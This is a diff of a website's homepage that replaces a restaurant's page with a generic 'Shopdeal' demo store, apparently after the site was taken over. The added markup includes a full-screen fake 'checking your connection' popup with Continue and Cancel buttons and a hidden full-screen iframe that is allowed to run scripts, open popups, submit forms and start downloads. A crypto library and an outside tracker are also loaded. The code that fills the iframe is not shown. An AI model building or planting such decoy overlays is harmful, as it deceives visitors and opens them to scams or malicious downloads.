@@ -1,695 +1,749 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Artisanal Cranberryfare & Haute Gastronomy — Cranberryfare</title>
-  <meta name="description" content="An extraordinary culinary celebration of heirloom stone fruits, small-batch artisanal preserves, seasonal orchard harvests, and private tasting salon hospitality at 181 Mercer Street.">
-  <link rel="canonical" href="https://cranberryfare.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Help0x0x-TD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/assets/css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-  <!-- Top Gastronomy Reservation Ticker (Paid Dinner Theme) -->
-  <div class="announcement-bar" style="background: #1C120C; color: #FAF7F2;">
-    <span>◈ PRIVATE DINNER SALON RESERVATIONS AT 181 MERCER STREET &bull; HEIRLOOM TUSCAN BRUSCHETTA &amp; WOOD-FIRED HEARTH BANQUETS &bull; TEL: +1-888-777-5845</span>
-  </div>
 
-  <!-- Mandatory Global Site Header (Exactly 1 per page) -->
-  <header class="site-header">
-    <div class="header-container">
-      <a href="/" class="brand-logo" aria-label="Cranberryfare Home">
-        <span class="logo-mark">◈</span>
-        <span class="logo-text">Cranberryfare</span>
-      </a>
-      <nav class="desktop-nav" aria-label="Primary Navigation">
-        <a href="/" class="nav-link active">Home</a>
-        <a href="/about.html" class="nav-link">The Atelier</a>
-        <a href="/collection.html" class="nav-link">Collections</a>
-        <a href="/blog.html" class="nav-link">Treatises</a>
-        <a href="/contact.html" class="nav-link">Concierge</a>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're checking your connection.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
+
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
       </nav>
-      <div class="header-actions">
-        <a href="/collection.html" class="btn btn-sm btn-outline">Explore Catalog</a>
-        <button id="drawer-toggle" class="mobile-toggle" aria-label="Open Navigation Menu">
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-          <span class="hamburger-bar"></span>
-        </button>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
+        </div>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
+
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
+
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-  </header>
 
-  <!-- Mandatory Mobile Navigation Drawer (Exactly 1 per page) -->
-  <div class="mobile-drawer" id="mobile-drawer" aria-hidden="true">
-    <div class="drawer-header">
-      <div class="drawer-brand">Cranberryfare</div>
-      <button id="drawer-close" class="drawer-close-btn" aria-label="Close Navigation Menu">&times;</button>
-    </div>
-    <nav class="drawer-nav" aria-label="Mobile Navigation">
-      <a href="/" class="drawer-link active">Home</a>
-      <a href="/about.html" class="drawer-link">The Atelier &amp; Craft</a>
-      <a href="/collection.html" class="drawer-link">Orchard Harvest & Confectionery Collection</a>
-      <a href="/blog.html" class="drawer-link">Sartorial Treatises</a>
-      <a href="/contact.html" class="drawer-link">Private Concierge</a>
-    </nav>
-    <div class="drawer-footer">
-      <p class="drawer-contact-title">Manhattan Atelier &amp; Suite</p>
-      <p class="drawer-contact-info">181 Mercer Street, New York, NY 10012, United States</p>
-      <p class="drawer-contact-info">Tel: +1-888-777-5845</p>
-      <p class="drawer-contact-info">Email: concierge@cranberryfare.com</p>
-    </div>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
+
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-  <div id="drawer-overlay" class="drawer-overlay"></div>
 
-  <!-- SECTION 1: EDITORIAL CULINARY HERO SHOWCASE (THE HEARTH TABLE) -->
-  <section class="section" style="padding: 5rem 0 5.5rem; background: linear-gradient(180deg, #F3ECE2 0%, #FAF7F2 100%);">
-    <div class="container">
-      <div style="display: grid; grid-template-columns: 1.15fr 1fr; gap: 4rem; align-items: center;">
-        <div>
-          <span style="display: inline-block; background: #F8ECE8; color: #B83A1B; border: 1px solid rgba(184, 58, 27, 0.25); padding: 0.35rem 0.95rem; font-size: 0.78rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.08em; border-radius: 50px; margin-bottom: 1.2rem;">
-            HAUTE ITALIAN BANQUET &bull; WOOD-FIRED HEARTH
-          </span>
-          <h1 style="margin-bottom: 1.2rem; font-size: clamp(2.4rem, 4.5vw, 3.8rem); line-height: 1.15; color: #1C120C;">
-            The Convivial Splendor of Artisanal Botanical Gastronomy
-          </h1>
-          <p class="lead" style="margin-bottom: 1.8rem; font-size: 1.12rem; line-height: 1.75; color: #3A2E26;">
-            Wild mountain cranberry glazes, heirloom botanical harvests, and wood-fired culinary delicacies crafted at 181 Mercer Street.
-          </p>
-          <div style="display: flex; gap: 1.2rem; flex-wrap: wrap; margin-bottom: 2.2rem; font-size: 0.88rem; color: #5C4D44;">
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> 800° Wood-Fired Oak Hearth</span>
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> First Cold-Press Tuscan EVO</span>
-            <span style="display: flex; align-items: center; gap: 0.4rem;"><strong>◈</strong> Heirloom San Marzano Harvests</span>
-          </div>
-          <div style="display: flex; gap: 1.2rem; flex-wrap: wrap; align-items: center; margin-bottom: 2.5rem;">
-            <a href="/collection.html" class="btn btn-primary" style="background: #1C120C; color: #FAF7F2 !important;">Reserve Banquet Table &rarr;</a>
-            <a href="/about.html" class="btn btn-outline" style="border-color: #1C120C; color: #1C120C !important;">The Mercer St Salon</a>
-          </div>
-          <div style="display: flex; align-items: center; gap: 1rem; padding-top: 1.5rem; border-top: 1px solid var(--color-border);">
-            <div style="color: #D97706; font-size: 1.1rem; letter-spacing: 0.1em;">★★★★★</div>
-            <div style="font-size: 0.86rem; color: #5C4D44;">
-              <strong>4.99 / 5.0 Rating</strong> &bull; Over 9,400+ Convivial Dinners Hosted in SoHo Manhattan
-            </div>
-          </div>
-        </div>
-        <div style="position: relative;">
-          <div style="border-radius: var(--radius-md); overflow: hidden; box-shadow: var(--shadow-lg); border: 1px solid var(--color-border); background: #FFF;">
-            <img src="/assets/images/artisan_pan_seared_dumpling_course.jpg" alt="Cranberryfare grand banquet feasting table" style="width: 100%; height: auto;">
-          </div>
-          <div style="position: absolute; bottom: -1rem; left: 1.5rem; background: #FFFFFF; border: 1px solid var(--color-border); padding: 0.85rem 1.4rem; border-radius: var(--radius-sm); box-shadow: var(--shadow-md); display: flex; align-items: center; gap: 0.8rem;">
-            <span style="font-size: 1.3rem;">🍷</span>
-            <div>
-              <div style="font-size: 0.82rem; font-weight: 700; color: #1C120C; text-transform: uppercase;">Michelin-Calibre Private Dining Salon</div>
-              <div style="font-size: 0.75rem; color: #736357;">Reservations Courtesy of 181 Mercer St &bull; Tel: +1-888-777-5845</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
 
-  <!-- SECTION 2: THE FOUR PILLARS OF THE TUSCAN HEARTH (4-COLUMN GRID) -->
-  <section class="trust-bar" style="background: #FFFFFF;">
-    <div class="container">
-      <div class="trust-grid">
-        <div class="trust-item">
-          <div class="trust-icon-box" style="background: #FAF0EC; color: #B83A1B;">🍞</div>
-          <div>
-            <div class="trust-title">Fermented Country Levain</div>
-            <p class="trust-desc">48-hour slow cold fermentation creating blistered, charred sourdough crusts over white oak.</p>
-          </div>
-        </div>
-        <div class="trust-item">
-          <div class="trust-icon-box" style="background: #FAF0EC; color: #B83A1B;">🫒</div>
-          <div>
-            <div class="trust-title">Single-Estate Tuscan EVO</div>
-            <p class="trust-desc">Cold-extracted Moraiolo &amp; Frantoio olive oil with vibrant peppery finish and low acidity.</p>
-          </div>
-        </div>
-        <div class="trust-item">
-          <div class="trust-icon-box" style="background: #FAF0EC; color: #B83A1B;">🍅</div>
-          <div>
-            <div class="trust-title">Heirloom San Marzano Crops</div>
-            <p class="trust-desc">Sweet volcanic soils produce vine-ripened tomatoes harvested at peak afternoon sugar density.</p>
-          </div>
-        </div>
-        <div class="trust-item">
-          <div class="trust-icon-box" style="background: #FAF0EC; color: #B83A1B;">📍</div>
-          <div>
-            <div class="trust-title">181 Mercer Street Salon</div>
-            <p class="trust-desc">An intimate 24-seat candlelit dining chamber in the historic cast-iron district of SoHo.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
 
-  <!-- SECTION 3: FLAGSHIP BRUSCHETTA & DEGUSTATION VITRINE (BOUTIQUE MENU GRID) -->
-  <section class="section">
-    <div class="container">
-      <div class="section-header text-center">
-        <div class="section-subtitle">Curated Evening Degustations</div>
-        <h2>Artisanal Bruschetta &amp; Hearth Courses</h2>
-        <p class="text-muted" style="max-width: 680px; margin: 0.8rem auto 0;">
-          Prepared upon blazing white oak embers and paired with rare Italian regional vintages curated by our head sommelier.
-        </p>
-      </div>
-      <div class="grid-4">
-        <!-- Course 1 -->
-        <div class="paid-product-card">
-          <span class="paid-product-badge" style="background: #B83A1B;">Signature Antipasto</span>
-          <div class="paid-product-img-wrap">
-            <img src="/assets/images/artisanal_cranberry_tart_pastry.jpg" alt="The Mercer Classic Pomodoro Bruschetta">
-          </div>
-          <div class="paid-product-body">
-            <div class="paid-product-rating">★★★★★ <span>(284)</span></div>
-            <div class="paid-product-title">The Mercer Classic Pomodoro</div>
-            <div class="paid-product-price">
-              <span class="price-current">$24.00</span>
-              <span class="price-original">À La Carte</span>
-            </div>
-            <p style="font-size: 0.85rem; color: #5C4D44; margin-bottom: 0.6rem;">Blistered sourdough, hand-crushed heirloom pomodori, raw garlic rub, 25-year Modena balsamico.</p>
-            <div style="font-size: 0.8rem; color: #B83A1B; font-weight: 600; margin-bottom: 0.8rem;">
-              Wine Pairing: Vermentino di Bolgheri 2021
-            </div>
-            <a href="/collection.html" class="btn btn-sm btn-outline" style="margin-top: auto; width: 100%; text-align: center;">View Menu Details &rarr;</a>
-          </div>
-        </div>
